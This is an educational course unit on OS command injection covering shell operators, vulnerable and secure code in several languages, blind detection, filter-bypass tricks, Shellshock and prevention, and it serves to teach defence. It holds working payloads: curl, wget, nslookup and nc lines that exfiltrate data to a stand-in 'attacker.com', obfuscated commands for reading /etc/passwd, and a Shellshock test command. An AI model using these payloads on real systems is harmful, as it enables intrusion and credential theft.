# Unit 3: A03 - Injection — Topic 4: OS Command Injection

## Overview

OS command injection occurs when an application passes **unsafe user-supplied data to a system shell**. This allows attackers to execute arbitrary operating system commands on the server, leading to full system compromise. Command injection is one of the most severe vulnerabilities — it provides **direct Remote Code Execution (RCE)** and is ranked Critical in virtually all severity frameworks.

---

## 1. How Command Injection Works

```
┌─────────────────────────────────────────────────────────────────┐
│                 COMMAND INJECTION FLOW                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Application Feature: "Ping a host"                            │
│                                                                 │
│  Normal Input: 192.168.1.1                                     │
│  Executed: ping -c 4 192.168.1.1                               │
│  Result: Ping output ✅                                         │
│                                                                 │
│  Malicious Input: 192.168.1.1; cat /etc/passwd                 │
│  Executed: ping -c 4 192.168.1.1; cat /etc/passwd              │
│  Result: Ping output + /etc/passwd contents ❌                  │
│                                                                 │
│  The semicolon (;) terminates the first command                │
│  and starts a new arbitrary command                            │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Shell Metacharacters and Chaining Operators

| Operator | Behavior | Example |
|----------|----------|---------|
| `;` | Command separator (always executes both) | `ping 1.1.1.1; whoami` |
| `\|` | Pipe (output of first → input of second) | `cat file \| nc attacker 80` |
| `\|\|` | OR (second runs if first fails) | `false \|\| whoami` |
| `&&` | AND (second runs if first succeeds) | `ping 1.1.1.1 && whoami` |
| `` ` `` | Backtick substitution | `` ping `whoami`.attacker.com `` |
| `$()` | Command substitution | `ping $(whoami).attacker.com` |
| `\n` / `%0a` | Newline (command separator) | `input%0awhoami` |
| `>` | Redirect output to file | `whoami > /var/www/out.txt` |
| `<` | Input from file | `cmd < /etc/passwd` |

### Windows-Specific Operators

| Operator | Behavior | Example |
|----------|----------|---------|
| `&` | Command separator | `ping 1.1.1.1 & whoami` |
| `\|` | Pipe | `type file \| findstr pass` |
| `&&` | AND | `dir && whoami` |
| `\|\|` | OR | `invalid \|\| whoami` |
| `%0a` | Newline | URL-encoded newline |

---

## 3. Vulnerable Functions by Language

| Language | Vulnerable Functions | Safer Alternatives |
|----------|---------------------|-------------------|
| **Python** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)` | `subprocess.run([], shell=False)` |
| **PHP** | `system()`, `exec()`, `passthru()`, `shell_exec()`, `` ` `` | `escapeshellarg()` + specific functions |
| **Node.js** | `child_process.exec()`, `child_process.execSync()` | `child_process.execFile()`, `spawn()` |
| **Java** | `Runtime.exec()`, `ProcessBuilder` with shell | `ProcessBuilder` without shell |
| **Ruby** | `system()`, `exec()`, `` ` `` , `%x{}`, `IO.popen()` | `system("cmd", "arg1", "arg2")` |

### Vulnerable vs Secure Code

```python
# ❌ VULNERABLE — shell=True with user input
import subprocess
domain = request.args.get('domain')
output = subprocess.check_output(f"nslookup {domain}", shell=True)

# ✅ SECURE — shell=False, argument array
domain = request.args.get('domain')
# Validate input
import re
if not re.match(r'^[a-zA-Z0-9.-]+$', domain):
    abort(400, 'Invalid domain')
output = subprocess.check_output(["nslookup", domain], shell=False)
```

```javascript
// ❌ VULNERABLE — exec() runs through shell
const { exec } = require('child_process');
exec(`ping -c 4 ${userInput}`, (err, stdout) => {
    res.send(stdout);
});

// ✅ SECURE — execFile() does NOT use shell
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput], (err, stdout) => {
    res.send(stdout);
});
```

```java
// ❌ VULNERABLE — Runtime.exec with concatenation
Runtime.getRuntime().exec("ping -c 4 " + userInput);

// ✅ SECURE — ProcessBuilder with argument array
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", userInput);
pb.redirectErrorStream(true);
Process process = pb.start();
```

---

## 4. Blind Command Injection

When command output is not returned in the response:

### Time-Based Detection

```bash
# Inject a sleep/delay command
; sleep 10       → If response takes 10+ seconds = vulnerable
& ping -c 10 127.0.0.1 &    → ~10 second delay on Windows/Linux
| timeout 10     → Windows delay
```

### Out-of-Band Detection

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com &    # Windows

# HTTP exfiltration
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
; wget http://attacker.com/$(whoami)
| powershell -c "IWR http://attacker.com/$env:USERNAME"    # Windows

# File write (then read via web)
; whoami > /var/www/html/output.txt
# Then access: http://target.com/output.txt

# Using Burp Collaborator or interactsh
; curl burp-collaborator-subdomain.oastify.com
; nslookup $(whoami).interact.sh
```

---

## 5. Filter Bypass Techniques

```bash
# If spaces are filtered
;cat</etc/passwd            # Use < instead of space
;{cat,/etc/passwd}          # Brace expansion
;cat${IFS}/etc/passwd       # $IFS = Internal Field Separator (space)
;cat$IFS/etc/passwd
;X=$'cat\x20/etc/passwd'&&$X  # Hex encoding

# If specific commands are blocked
;/bin/c?t /etc/passwd       # Wildcard substitution
;/bin/ca* /etc/passwd       # Glob matching
;c''at /etc/passwd          # Quote insertion
;c""at /etc/passwd          # Double quote insertion
;c\at /etc/passwd           # Backslash insertion
;$'\x63\x61\x74' /etc/passwd  # Hex-encoded characters

# If specific strings (/etc/passwd) are blocked
;cat /etc/pas??d            # Wildcards in path
;cat /e*c/p*d               # Glob patterns
;cat /etc/pass${empty}wd    # Variable insertion

# Base64 encoding bypass
;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
# Decodes to: cat /etc/passwd

# Reverse string
;echo 'dwssap/cte/ tac' | rev | bash
```

---

## 6. Real-World Command Injection

### Shellshock (CVE-2014-6271)

```bash
# Bash environment variable processing vulnerability
# Affected CGI scripts, DHCP clients, OpenSSH

# Test payload
curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://target.com/cgi-bin/test.cgi

# The function definition () { :; } is followed by arbitrary commands
# Bash parses the env variable and executes the trailing commands
```

### Citrix NetScaler (CVE-2023-3519)

```
Impact: Unauthenticated RCE on Citrix ADC/Gateway
Method: Command injection in SAML parsing
Used by: Nation-state actors for network intrusion
CVSS: 9.8 Critical
```

---

## 7. Prevention

### Defense in Depth

```
1. AVOID SHELL COMMANDS — Use language-native libraries
   ❌ os.system("ping " + ip)
   ✅ import icmplib; icmplib.ping(ip)

2. USE ARGUMENT ARRAYS — Never shell=True
   ❌ subprocess.run(f"cmd {input}", shell=True)
   ✅ subprocess.run(["cmd", input], shell=False)

3. INPUT VALIDATION — Strict whitelist
   if not re.match(r'^[a-zA-Z0-9.-]+$', input):
       reject()

4. LEAST PRIVILEGE — Run services with minimal OS permissions
   Don't run web server as root

5. SANDBOXING — Containers, seccomp, AppArmor
   Limit system calls available to application

6. WAF — Block common injection patterns
   ModSecurity, AWS WAF rules
```

---

## Summary Table

| Aspect | Detail |
|--------|--------|
| **Severity** | Critical (direct RCE) |
| **Root Cause** | User input in shell commands |
| **Key Operators** | `;`, `|`, `&&`, `||`, `` ` ``, `$()` |
| **Blind Detection** | Time-based delay, OOB DNS/HTTP |
| **Primary Prevention** | Avoid shell; use argument arrays |
| **Testing Tools** | Burp, Commix, manual payloads |

---

## Revision Questions

1. What is the difference between command injection and code injection?
2. List all shell metacharacters that can chain commands and explain each.
3. How do you detect blind command injection when there is no output in the response?
4. Compare vulnerable functions across Python, Node.js, PHP, and Java. What are the secure alternatives?
5. Describe five filter bypass techniques for command injection.
6. Why is using `shell=False` (or equivalent) the primary defense against command injection?

---

*Previous: [03-nosql-injection.md](03-nosql-injection.md) | Next: [05-ldap-injection.md](05-ldap-injection.md)*

---

*[Back to README](../README.md)*
